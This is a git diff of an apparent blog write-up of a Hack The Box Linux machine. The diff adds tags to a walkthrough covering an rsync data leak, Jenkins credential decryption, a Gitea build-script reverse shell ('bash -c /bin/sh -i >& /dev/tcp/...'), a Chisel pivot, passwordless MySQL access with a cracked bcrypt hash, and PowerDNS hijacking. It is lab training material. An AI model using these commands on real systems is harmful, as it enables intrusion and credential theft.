@@ -8,7 +8,17 @@ tags:
   - blog
   - HTB
   - Linux
-lastmod: 2026-04-26T07:13:09.401Z
+  - Port873-rsync-dataleak
+  - Decode-jenkins-users-hashcat
+  - Decode-jenkins-credentials-decryptor
+  - CMS-Authenticated-Gitea-RCE
+  - Linux-Privilege-docker-identify
+  - inux-Privilege-check-my-ip
+  - Linux-Privilege-linux-x86-nmap-install
+  - Lateral-Movement-Chisel-proxy-kali-arm-to-linux-x86
+  - Port3306-mysql-enumerating
+  - CMS-PowerDNS-Admin-Owned-DNS
+lastmod: 2026-05-07T06:47:37.908Z
 ---
 # Box Info
 
@@ -18,9 +28,7 @@ lastmod: 2026-04-26T07:13:09.401Z
 
 # Recon
 
-### \[\[PORT & IP SCAN]]
-
-The `nmap` reveal that the machine is ((change it) a standard Windows AD Server , with the kerberos auth , also the ldap query , and the 3389 port show that the domain `AWSJPDC0522.shibuya.vl` ,but the ldap anonymous inquiry failed .)
+### PORT & IP SCAN
 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
@@ -98,11 +106,15 @@ Always Check the source is a good habit , so i found the CMS version
 But seem like not much the version is easily to be exploited !\
 ![Pasted image 20260423215950.png](/ob/Pasted%20image%2020260423215950.png)
 
+Nothing else too interesting here, and no need to directory brute force as it’s known software.
+
 ### Port 873
 
-Port 873 is the ==default TCP port for the **[rsync daemon (service) mode](https://www.google.com/search?client=firefox-b-d\&q=rsync+daemon+%28service%29+mode\&mstk=AUtExfBZazdGih4n8jIL6tq2EfZTqZiNzcD3EL1H6kdCFvw_6rECEDPbvZxNjewa5-BEtBrRy_XcrRCKCVmrZhuwUbulo7BKLBkzUwm_Bk8Vl7tuhN0MZur3Xxok29eHc97HIRTeCW8p_s77Rb-e9NAwtE2rgevbqivh1BNqZaVxJAkv7hs\&csui=3\&ved=2ahUKEwj2suu8mISUAxWr2DQHHY2oEacQgK4QegQIARAC)**==, designed for fast, efficient, and incremental file synchronization, often used in network backups, mirroring, and data distribution.
+{{< toggle "Tag 🏷️" >}}
 
-Discovering Public Modules
+{{< tag "Port873-rsync-dataleak" >}} Port 873 is the default TCP port for the designed for fast, efficient, and incremental file synchronization, often used in network backups, mirroring, and data distribution.I’ll list the directories available over rsync.
+
+{{< /toggle >}}
 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
@@ -133,6 +145,12 @@ sent 47 bytes  received 376,381,250 bytes  786,585.78 bytes/sec
 total size is 376,289,280  speedup is 1.00
 
 ```
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Decode-jenkins-users-hashcat" >}} After unzip the jenkins backup file , found the users list to decode to get the password
+
+{{< /toggle >}}
 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
@@ -294,7 +312,11 @@ in the /jenkins\_configuration/jobs/build  's config.xml  is for connecting to a
 
 #### secrets
 
-using the https://github.com/hoto/jenkins-credentials-decryptor to dumping Jenkins credentials.
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Decode-jenkins-credentials-decryptor" >}} using the https://github.com/hoto/jenkins-credentials-decryptor to dumping Jenkins credentials.
+
+{{< /toggle >}}
 
 download the script
 
@@ -329,13 +351,19 @@ It needs the master key, the Hudson secret, and the config file:
 ]                                               
 ```
 
-### Port 3000
+### Port 3000 Authenticated Gitea
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "CMS-Authenticated-Gitea-RCE" >}} Authenticated Gitea to inject the revshell to get the RCE
+
+{{< /toggle >}}
 
 The cred can be logined as the buildadm
 
 ![Pasted image 20260423234629.png](/ob/Pasted%20image%2020260423234629.png)
 
-Discovering the file will run the sh , i will try to give the revshell to replace\
+Discovering the file will run the sh , I will try to give the revshell to replace\
 ![Pasted image 20260423234738.png](/ob/Pasted%20image%2020260423234738.png)
 
 It is worked !!
@@ -348,7 +376,13 @@ sh 'bash -c "/bin/sh -i >& /dev/tcp/10.10.16.39/3000 0>&1"'
 
 ![Pasted image 20260424000717.png](/ob/Pasted%20image%2020260424000717.png)
 
-The hostname is twelve hex characters, which matches the Docker default. There’s a `.dockerenv` file in the filesystem root:
+### docker
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Linux-Privilege-docker-identify" >}} The hostname is twelve hex characters, which matches the Docker default. There’s a `.dockerenv` file in the filesystem root:
+
+{{< /toggle >}}
 
 ```
 # uname -a 
@@ -358,7 +392,11 @@ Linux 5ac6c7d6fb8e 5.15.0-144-generic #157-Ubuntu SMP Mon Jun 16 07:33:10 UTC 20
 # 
 ```
 
-`ip` and `ifconfig` are not installed, but the IP is 172.18.0.3: , but can view it in `/proc/net/fib_trie`
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "inux-Privilege-check-my-ip" >}} ip and ifconfig are not installed, but the IP is 172.18.0.3: , but can view it in `/proc/net/fib_trie`
+
+{{< /toggle >}}
 
 ```
 # cat /proc/net/fib_trie
@@ -404,7 +442,11 @@ Local:
            /32 link BROADCAST
 ```
 
-I’ll grab a copy of a [static compiled nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) and upload it to the container:
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Linux-Privilege-linux-x86-nmap-install" >}} I’ll grab a copy of a https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86\_64/nmap  and upload it to the container for nmap
+
+{{< /toggle >}}
 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
@@ -521,7 +563,13 @@ Nmap done: 256 IP addresses (6 hosts up) scanned in 2.06 seconds
 * .5 - `nmap` shows both 53 and 8081, which is an interesting combination. `curl` on 8081 returns just a 401 unauthorized.
 * .6 - Some kind of webserver on 80. A quick `curl` of this port redirects to `/login`, which shows a title of PowerDNS-Admin. This could be related to the open DNS ports on .5.
 
-I’ll use [Chisel](https://github.com/jpillora/chisel) to create a proxy through my reverse shell to access the other containers from my VM. I’ll start the server on my host with `--reverse` to allow reverse connections and `-p 8000` because Burp is already listening on the default port of 8080 on my host. Next I’ll upload the latest Linux binary to the container, make it executable, and connect:
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Lateral-Movement-Chisel-proxy-kali-arm-to-linux-x86" >}} I’ll use Chisel to create a proxy through my reverse shell to access the other containers from my VM. I’ll start the server on my host with `--reverse` to allow reverse connections and `-p 8000` because Burp is already listening on the default port of 8080 on my host. Next I’ll upload the latest Linux binary to the container, make it executable, and connect:
+
+{{< /toggle >}}
+
+Ref :  [Chisel](https://github.com/jpillora/chisel)
 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
@@ -573,7 +621,7 @@ chisel_1.11.5_darwin_ 100%[======================>]   4.18M  3.93MB/s    in 1.1s
 
 ```
 
-for my mac arm64
+for my kali m2  arm64
 
 ```
   
@@ -646,8 +694,11 @@ Set-Cookie: session=57e01ac8-d529-4d4d-b1d3-da732db64a0e; Expires=Sat, 25 Apr 20
 
 ```
 
-I don’t have any password information for the MySQL service, but I can try connecting as root and it let’s met in:\
-try to login the mysql without password
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Port3306-mysql-enumerating" >}} I don’t have any password information for the MySQL service, but I can try connecting as root and it let’s met in. Moreover; use the --skip-ssl to ignore the error, enumerating the mysql DB to have the website login password.
+
+{{< /toggle >}}
 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
@@ -748,6 +799,12 @@ $2b$12$s1hK0o7YNkJGfu5poWx.0u1WLqKQIgJOXWjjXz7Ze3Uw5Sc2.hsEq:winston
 ![Pasted image 20260425145439.png](/ob/Pasted%20image%2020260425145439.png)
 
 http://172.18.0.6/login
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "CMS-PowerDNS-Admin-Owned-DNS" >}} With the Authenticated account to login the PowerDNS , change the DNS ip to mine , then i can login with rsh by root
+
+{{< /toggle >}}
 
 Now I can log in as admin, leaving the OTP token field empty (as it was Null in the `user` table):
 
